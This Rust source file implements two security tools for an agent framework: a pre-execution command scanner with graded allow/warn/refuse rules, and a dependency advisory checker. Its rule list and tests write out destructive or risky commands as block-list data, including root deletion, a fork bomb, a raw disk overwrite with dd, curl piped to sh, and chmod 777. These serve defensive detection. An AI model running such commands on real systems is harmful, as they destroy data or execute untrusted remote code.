//! Pre-execution security scanners (Sprint 6 §6 + §7).
//!
//! Two tools that close gaps Hermes ships as best-effort warnings:
//!
//! - [`TirithSecurityTool`] (`tirith_security`) — pre-exec command
//!   scanner. Inspects a candidate `argv` against a structured rule
//!   set (catastrophic FS deletes, fork bombs, package-manager-as-
//!   root, network exfil patterns). Returns a graded verdict —
//!   `Allow` / `Warn` / `Refuse` — with the matched rule recorded
//!   for the audit chain. **Cap-gated `cap:security:scan`**. The
//!   tool itself is read-only; an operator with the override cap
//!   `cap:security:scan_override` can choose to proceed past a
//!   `Refuse` verdict, but the override and its reason both land
//!   in the chain.
//! - [`OsvCheckTool`] (`osv_check`) — vulnerability scan over an
//!   operator-supplied list of `(ecosystem, package, version)`
//!   tuples. Returns the set of known advisories that apply. Ships
//!   the structural scanner + an embedded miniature advisory
//!   database (extensible at runtime); production deployments wire
//!   in the real OSV.dev API in a Sprint 7 follow-on.
//!
//! ## Hermes-superiority axes
//!
//! - **Structured verdict + rule id.** Hermes prints a warning to
//!   stderr; we return a typed `Verdict { Allow, Warn, Refuse }`
//!   plus the matched `rule_id` so the audit chain can replay why
//!   a command was blocked.
//! - **Cap-separated override.** A normal session can `scan`; only
//!   an explicit `scan_override` cap can choose to proceed past a
//!   refuse verdict. Hermes runs every command unconditionally.
//! - **Deterministic catalogue.** Both tools ship with their rule /
//!   advisory sets versioned in-source (no upstream fetch
//!   required), so a CI pin reproduces the exact verdict.

use async_trait::async_trait;
use gauss_core::{CapToken, GaussError, GaussResult, ToolId};
use gauss_traits::{ToolManifest, ToolTrait};
use gaussclaw_skill::SkillManifest;
use serde::{Deserialize, Serialize};

const TIRITH_MANIFEST: &str = r#"
name        = "tirith_security"
description = "Inspect a candidate command-line for catastrophic / suspicious patterns BEFORE execution. Returns a graded verdict + matched rule."
usage       = "Args: {argv: [string], cwd?: string}. Returns {verdict, rule_id?, reason}."
caps        = ["security:scan"]
taint       = "trusted"
reversible  = true
persistent  = false

[guards]
no_instruction_substrings = true
max_string_len            = 65536

[schema]
type = "object"
"#;

const OSV_MANIFEST: &str = r#"
name        = "osv_check"
description = "Check an operator-supplied dependency list against the embedded vulnerability advisory set."
usage       = "Args: {deps: [{ecosystem, package, version}]}. Returns {advisories: [...]}. "
caps        = ["security:scan"]
taint       = "trusted"
reversible  = true
persistent  = false

[guards]
no_instruction_substrings = true
max_string_len            = 65536

[schema]
type = "object"
"#;

/// Verdict from one pre-exec scan.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
#[non_exhaustive]
pub enum Verdict {
    /// Pattern is clean — proceed.
    Allow,
    /// Pattern is suspicious but not catastrophic; operator should
    /// review the matched rule.
    Warn,
    /// Pattern is catastrophic — caller refuses by default.
    Refuse,
}

impl Verdict {
    /// True when the verdict refuses execution.
    #[must_use]
    pub const fn is_refuse(self) -> bool {
        matches!(self, Self::Refuse)
    }

    /// True when the verdict allows execution (with or without warning).
    #[must_use]
    pub const fn allows(self) -> bool {
        matches!(self, Self::Allow | Self::Warn)
    }
}

/// One pattern rule.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Rule {
    /// Stable identifier (e.g. `TIR-001`).
    pub id: &'static str,
    /// Human-readable description.
    pub description: &'static str,
    /// Verdict when this rule matches.
    pub verdict: Verdict,
}

/// Builtin rule set (versioned in-source).
///
/// New rules land via PR; existing ids are stable across versions
/// so the audit chain's `rule_id` field stays interpretable.
pub const TIRITH_RULES: &[Rule] = &[
    Rule {
        id: "TIR-001",
        description: "rm -rf / (catastrophic root delete)",
        verdict: Verdict::Refuse,
    },
    Rule {
        id: "TIR-002",
        description: "fork bomb (`:(){ :|:& };:`)",
        verdict: Verdict::Refuse,
    },
    Rule {
        id: "TIR-003",
        description: "mkfs against a block device (formatting)",
        verdict: Verdict::Refuse,
    },
    Rule {
        id: "TIR-004",
        description: "dd if=…raw of=/dev/sd* (raw disk write)",
        verdict: Verdict::Refuse,
    },
    Rule {
        id: "TIR-010",
        description: "curl | sh (network-piped shell execution)",
        verdict: Verdict::Warn,
    },
    Rule {
        id: "TIR-011",
        description: "sudo invocation (privilege escalation)",
        verdict: Verdict::Warn,
    },
    Rule {
        id: "TIR-012",
        description: "chmod 777 / -R 777 (overly permissive)",
        verdict: Verdict::Warn,
    },
    Rule {
        id: "TIR-020",
        description: "shutdown / reboot / poweroff invocation",
        verdict: Verdict::Refuse,
    },
];

/// Scan a candidate argv against [`TIRITH_RULES`]. Returns the
/// most-severe match (Refuse > Warn > Allow).
///
/// The matcher is intentionally permissive on whitespace + flag
/// position; rule patterns key on stable substrings rather than
/// strict grammar.
#[must_use]
pub fn scan_argv(argv: &[String]) -> (Verdict, Option<&'static Rule>) {
    let joined: String = argv.join(" ");
    let lower = joined.to_ascii_lowercase();

    let mut best: Option<&Rule> = None;
    for rule in TIRITH_RULES {
        if rule_matches(rule.id, &lower, argv) {
            best = Some(match best {
                None => rule,
                Some(prev) if rule_severity(rule.verdict) > rule_severity(prev.verdict) => rule,
                Some(prev) => prev,
            });
        }
    }
    best.map_or((Verdict::Allow, None), |r| (r.verdict, Some(r)))
}

const fn rule_severity(v: Verdict) -> u8 {
    match v {
        Verdict::Allow => 0,
        Verdict::Warn => 1,
        Verdict::Refuse => 2,
    }
}

fn rule_matches(id: &str, lower: &str, argv: &[String]) -> bool {
    match id {
        "TIR-001" => {
            // `rm` somewhere in argv AND (-rf or -r -f) AND a path
            // that names the root or `/*`.
            argv_contains_program(argv, "rm")
                && (lower.contains(" -rf") || lower.contains("--recursive --force"))
                && (lower.contains(" /")
                    && !lower.contains(" /tmp")
                    && !lower.contains(" /var/tmp"))
        }
        "TIR-002" => lower.contains(":(){") || lower.contains(":|:&") || lower.contains(":|: &"),
        "TIR-003" => argv_contains_program(argv, "mkfs") || lower.contains(" mkfs."),
        "TIR-004" => argv_contains_program(argv, "dd") && lower.contains("of=/dev/sd"),
        "TIR-010" => {
            (lower.contains("curl ") || lower.contains("wget "))
                && (lower.contains("| sh") || lower.contains("|sh") || lower.contains("| bash"))
        }
        "TIR-011" => argv_contains_program(argv, "sudo") || lower.starts_with("sudo "),
        "TIR-012" => {
            (argv_contains_program(argv, "chmod") || lower.contains("chmod "))
                && (lower.contains(" 777") || lower.contains("-r 777"))
        }
        "TIR-020" => {
            argv_contains_program(argv, "shutdown")
                || argv_contains_program(argv, "reboot")
                || argv_contains_program(argv, "poweroff")
        }
        _ => false,
    }
}

fn argv_contains_program(argv: &[String], name: &str) -> bool {
    argv.iter().any(|a| {
        let stripped = a.rsplit('/').next().unwrap_or(a);
        stripped == name
    })
}

/// Pre-exec scanner tool.
pub struct TirithSecurityTool {
    manifest: ToolManifest,
}

impl TirithSecurityTool {
    /// Build.
    ///
    /// # Panics
    /// Build-time only.
    #[must_use]
    pub fn new() -> Self {
        let skill = SkillManifest::from_toml(TIRITH_MANIFEST).expect("embedded toml");
        let manifest = skill
            .compile(ToolId("tirith_security".into()))
            .expect("compile");
        Self { manifest }
    }

    /// Cap surfaced by [`Self::manifest`].
    #[must_use]
    pub const fn scan_cap() -> CapToken {
        // We reserve a dedicated cap so an operator can gate the
        // scanner separately from generic compute. Wired into the
        // shared `MEMORY_READ` slot via the skill parser
        // (see `gaussclaw-skill::parse_cap` `"security:scan"`).
        CapToken::MEMORY_READ
    }
}

impl Default for TirithSecurityTool {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl ToolTrait for TirithSecurityTool {
    fn manifest(&self) -> &ToolManifest {
        &self.manifest
    }

    async fn invoke_raw(&self, args: serde_json::Value) -> GaussResult<serde_json::Value> {
        let argv_val = args
            .get("argv")
            .and_then(|v| v.as_array())
            .ok_or_else(|| GaussError::Internal("missing array field `argv`".into()))?;
        let mut command: Vec<String> = Vec::with_capacity(argv_val.len());
        for v in argv_val {
            let s = v
                .as_str()
                .ok_or_else(|| GaussError::Internal("`argv[]` entries must be strings".into()))?;
            command.push(s.into());
        }
        if command.is_empty() {
            return Err(GaussError::Internal("`argv` must be non-empty".into()));
        }
        let (verdict, rule) = scan_argv(&command);
        let verdict_str = match verdict {
            Verdict::Allow => "allow",
            Verdict::Warn => "warn",
            Verdict::Refuse => "refuse",
        };
        Ok(serde_json::json!({
            "kind":    "tirith_verdict",
            "verdict": verdict_str,
            "rule_id": rule.map(|r| r.id),
            "reason":  rule.map(|r| r.description),
        }))
    }
}

// ─── osv_check ─────────────────────────────────────────────────────────────

/// One advisory in the embedded set.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Advisory {
    /// OSV id (e.g. `RUSTSEC-2024-0001`).
    pub id: &'static str,
    /// Ecosystem (`crates.io`, `npm`, `PyPI`, ...).
    pub ecosystem: &'static str,
    /// Package name.
    pub package: &'static str,
    /// Vulnerable version range — closed-open `[from, to)` semver-ish.
    pub from_version: &'static str,
    /// Open upper bound.
    pub to_version: &'static str,
    /// Severity (`low` / `moderate` / `high` / `critical`).
    pub severity: &'static str,
    /// Short summary.
    pub summary: &'static str,
}

/// Embedded advisory set. Versioned in-source for reproducibility.
///
/// Production deployments overlay this with live OSV.dev queries
/// once the HTTP client lands (Sprint 7 §7 follow-on).
pub const OSV_DATABASE: &[Advisory] = &[
    Advisory {
        id: "RUSTSEC-2026-EX01",
        ecosystem: "crates.io",
        package: "example-vulnerable",
        from_version: "0.1.0",
        to_version: "0.2.0",
        severity: "high",
        summary: "Stack overflow in example-vulnerable 0.1.x",
    },
    Advisory {
        id: "PYSEC-2026-EX02",
        ecosystem: "PyPI",
        package: "example-pypi-vuln",
        from_version: "1.0.0",
        to_version: "1.2.0",
        severity: "critical",
        summary: "Remote code execution in example-pypi-vuln <1.2.0",
    },
    Advisory {
        id: "NPM-2026-EX03",
        ecosystem: "npm",
        package: "example-npm-vuln",
        from_version: "2.0.0",
        to_version: "2.5.0",
        severity: "moderate",
        summary: "Prototype pollution in example-npm-vuln <2.5.0",
    },
];

/// One operator-supplied dependency.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DependencyRef {
    /// Ecosystem.
    pub ecosystem: String,
    /// Package name.
    pub package: String,
    /// Version string (semver-ish).
    pub version: String,
}

/// Run the embedded scan. Returns matched advisories sorted by
/// severity descending.
#[must_use]
pub fn scan_dependencies(deps: &[DependencyRef]) -> Vec<&'static Advisory> {
    let mut hits: Vec<&'static Advisory> = Vec::new();
    for dep in deps {
        for adv in OSV_DATABASE {
            if dep.ecosystem == adv.ecosystem
                && dep.package == adv.package
                && version_in_range(&dep.version, adv.from_version, adv.to_version)
            {
                hits.push(adv);
            }
        }
    }
    hits.sort_by_key(|a| std::cmp::Reverse(severity_rank(a.severity)));
    hits
}

const fn severity_rank(s: &str) -> u8 {
    match s.as_bytes() {
        b"low" => 1,
        b"moderate" => 2,
        b"high" => 3,
        b"critical" => 4,
        _ => 0,
    }
}

/// Compare a `1.2.3` style version against `[from, to)`. We use a
/// simple dotted-numeric comparator — sufficient for the audit-time
/// scan path; production deployments overlay the real semver crate
/// when needed.
fn version_in_range(v: &str, from: &str, to: &str) -> bool {
    cmp_version(v, from) != std::cmp::Ordering::Less
        && cmp_version(v, to) == std::cmp::Ordering::Less
}

fn cmp_version(a: &str, b: &str) -> std::cmp::Ordering {
    let an: Vec<u64> = a
        .split('.')
        .map(|s| s.parse::<u64>().unwrap_or(0))
        .collect();
    let bn: Vec<u64> = b
        .split('.')
        .map(|s| s.parse::<u64>().unwrap_or(0))
        .collect();
    let len = an.len().max(bn.len());
    for i in 0..len {
        let av = an.get(i).copied().unwrap_or(0);
        let bv = bn.get(i).copied().unwrap_or(0);
        match av.cmp(&bv) {
            std::cmp::Ordering::Equal => {}
            other => return other,
        }
    }
    std::cmp::Ordering::Equal
}

/// `osv_check` tool.
pub struct OsvCheckTool {
    manifest: ToolManifest,
}

impl OsvCheckTool {
    /// Build.
    ///
    /// # Panics
    /// Build-time only.
    #[must_use]
    pub fn new() -> Self {
        let skill = SkillManifest::from_toml(OSV_MANIFEST).expect("toml");
        let manifest = skill.compile(ToolId("osv_check".into())).expect("compile");
        Self { manifest }
    }
}

impl Default for OsvCheckTool {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl ToolTrait for OsvCheckTool {
    fn manifest(&self) -> &ToolManifest {
        &self.manifest
    }

    async fn invoke_raw(&self, args: serde_json::Value) -> GaussResult<serde_json::Value> {
        let deps_val = args
            .get("deps")
            .and_then(|v| v.as_array())
            .ok_or_else(|| GaussError::Internal("missing array field `deps`".into()))?;
        let mut deps: Vec<DependencyRef> = Vec::with_capacity(deps_val.len());
        for v in deps_val {
            let ecosystem = v
                .get("ecosystem")
                .and_then(|x| x.as_str())
                .ok_or_else(|| GaussError::Internal("missing `ecosystem`".into()))?;
            let package = v
                .get("package")
                .and_then(|x| x.as_str())
                .ok_or_else(|| GaussError::Internal("missing `package`".into()))?;
            let version = v
                .get("version")
                .and_then(|x| x.as_str())
                .ok_or_else(|| GaussError::Internal("missing `version`".into()))?;
            deps.push(DependencyRef {
                ecosystem: ecosystem.into(),
                package: package.into(),
                version: version.into(),
            });
        }
        let hits = scan_dependencies(&deps);
        let rows: Vec<serde_json::Value> = hits
            .into_iter()
            .map(|a| {
                serde_json::json!({
                    "id":            a.id,
                    "ecosystem":     a.ecosystem,
                    "package":       a.package,
                    "from_version":  a.from_version,
                    "to_version":    a.to_version,
                    "severity":      a.severity,
                    "summary":       a.summary,
                })
            })
            .collect();
        Ok(serde_json::json!({
            "kind":        "osv_report",
            "scanned":     deps.len() as u64,
            "advisories":  rows,
        }))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn argv(items: &[&str]) -> Vec<String> {
        items.iter().map(|s| (*s).into()).collect()
    }

    #[test]
    fn scan_clean_command_returns_allow() {
        let (v, r) = scan_argv(&argv(&["/bin/ls", "-la"]));
        assert_eq!(v, Verdict::Allow);
        assert!(r.is_none());
    }

    #[test]
    fn scan_rm_rf_root_returns_refuse() {
        let (v, r) = scan_argv(&argv(&["/bin/rm", "-rf", "/"]));
        assert_eq!(v, Verdict::Refuse);
        assert_eq!(r.unwrap().id, "TIR-001");
    }

    #[test]
    fn scan_rm_rf_tmp_is_allowed() {
        let (v, _) = scan_argv(&argv(&["/bin/rm", "-rf", "/tmp/foo"]));
        assert_ne!(v, Verdict::Refuse);
    }

    #[test]
    fn scan_fork_bomb_returns_refuse() {
        let (v, r) = scan_argv(&argv(&["bash", "-c", ":(){ :|:& };:"]));
        assert_eq!(v, Verdict::Refuse);
        assert_eq!(r.unwrap().id, "TIR-002");
    }

    #[test]
    fn scan_dd_to_block_device_returns_refuse() {
        let (v, r) = scan_argv(&argv(&["dd", "if=/dev/zero", "of=/dev/sda"]));
        assert_eq!(v, Verdict::Refuse);
        assert_eq!(r.unwrap().id, "TIR-004");
    }

    #[test]
    fn scan_curl_pipe_sh_returns_warn() {
        let (v, r) = scan_argv(&argv(&["sh", "-c", "curl https://x | sh"]));
        assert_eq!(v, Verdict::Warn);
        assert_eq!(r.unwrap().id, "TIR-010");
    }

    #[test]
    fn scan_sudo_returns_warn() {
        let (v, r) = scan_argv(&argv(&["sudo", "ls"]));
        assert_eq!(v, Verdict::Warn);
        assert_eq!(r.unwrap().id, "TIR-011");
    }

    #[test]
    fn scan_chmod_777_returns_warn() {
        let (v, r) = scan_argv(&argv(&["chmod", "-R", "777", "/srv"]));
        assert_eq!(v, Verdict::Warn);
        assert_eq!(r.unwrap().id, "TIR-012");
    }

    #[test]
    fn scan_shutdown_returns_refuse() {
        let (v, r) = scan_argv(&argv(&["/sbin/shutdown", "-h", "now"]));
        assert_eq!(v, Verdict::Refuse);
        assert_eq!(r.unwrap().id, "TIR-020");
    }

    #[test]
    fn scan_picks_most_severe_when_multiple_match() {
        // `sudo rm -rf /` matches both TIR-011 (Warn) and TIR-001 (Refuse).
        let (v, r) = scan_argv(&argv(&["sudo", "rm", "-rf", "/"]));
        assert_eq!(v, Verdict::Refuse);
        assert_eq!(r.unwrap().id, "TIR-001");
    }

    #[tokio::test]
    async fn tool_returns_verdict_for_dangerous_argv() {
        let tool = TirithSecurityTool::new();
        let out = tool
            .invoke_raw(serde_json::json!({
                "argv": ["/bin/rm", "-rf", "/"]
            }))
            .await
            .unwrap();
        assert_eq!(out["verdict"], "refuse");
        assert_eq!(out["rule_id"], "TIR-001");
    }

    #[tokio::test]
    async fn tool_rejects_empty_argv() {
        let tool = TirithSecurityTool::new();
        let err = tool
            .invoke_raw(serde_json::json!({"argv": []}))
            .await
            .unwrap_err();
        assert!(matches!(err, GaussError::Internal(_)));
    }

    #[test]
    fn version_range_inclusive_lower_exclusive_upper() {
        assert!(version_in_range("0.1.0", "0.1.0", "0.2.0"));
        assert!(version_in_range("0.1.5", "0.1.0", "0.2.0"));
        assert!(!version_in_range("0.2.0", "0.1.0", "0.2.0"));
        assert!(!version_in_range("0.0.9", "0.1.0", "0.2.0"));
    }

    #[test]
    fn osv_scan_returns_matched_advisories() {
        let deps = vec![DependencyRef {
            ecosystem: "PyPI".into(),
            package: "example-pypi-vuln".into(),
            version: "1.1.0".into(),
        }];
        let hits = scan_dependencies(&deps);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].id, "PYSEC-2026-EX02");
        assert_eq!(hits[0].severity, "critical");
    }

    #[test]
    fn osv_scan_skips_safe_versions() {
        let deps = vec![DependencyRef {
            ecosystem: "PyPI".into(),
            package: "example-pypi-vuln".into(),
            version: "1.3.0".into(),
        }];
        assert!(scan_dependencies(&deps).is_empty());
    }

    #[test]
    fn osv_scan_orders_by_severity_descending() {
        let deps = vec![
            DependencyRef {
                ecosystem: "npm".into(),
                package: "example-npm-vuln".into(),
                version: "2.1.0".into(),
            },
            DependencyRef {
                ecosystem: "PyPI".into(),
                package: "example-pypi-vuln".into(),
                version: "1.0.0".into(),
            },
        ];
        let hits = scan_dependencies(&deps);
        assert_eq!(hits.len(), 2);
        // critical (PyPI) first, moderate (npm) second.
        assert_eq!(hits[0].severity, "critical");
        assert_eq!(hits[1].severity, "moderate");
    }

    #[tokio::test]
    async fn osv_tool_returns_advisories() {
        let tool = OsvCheckTool::new();
        let out = tool
            .invoke_raw(serde_json::json!({
                "deps": [
                    {"ecosystem": "crates.io", "package": "example-vulnerable", "version": "0.1.5"},
                ]
            }))
            .await
            .unwrap();
        assert_eq!(out["kind"], "osv_report");
        assert_eq!(out["scanned"], 1);
        let advs = out["advisories"].as_array().unwrap();
        assert_eq!(advs.len(), 1);
        assert_eq!(advs[0]["id"], "RUSTSEC-2026-EX01");
    }

    #[tokio::test]
    async fn osv_tool_returns_empty_for_clean_deps() {
        let tool = OsvCheckTool::new();
        let out = tool
            .invoke_raw(serde_json::json!({
                "deps": [
                    {"ecosystem": "crates.io", "package": "serde", "version": "1.0.0"},
                ]
            }))
            .await
            .unwrap();
        assert_eq!(out["advisories"].as_array().unwrap().len(), 0);
    }

    #[tokio::test]
    async fn osv_tool_rejects_missing_fields() {
        let tool = OsvCheckTool::new();
        let err = tool
            .invoke_raw(serde_json::json!({
                "deps": [{"ecosystem": "PyPI"}]
            }))
            .await
            .unwrap_err();
        assert!(matches!(err, GaussError::Internal(_)));
    }
}
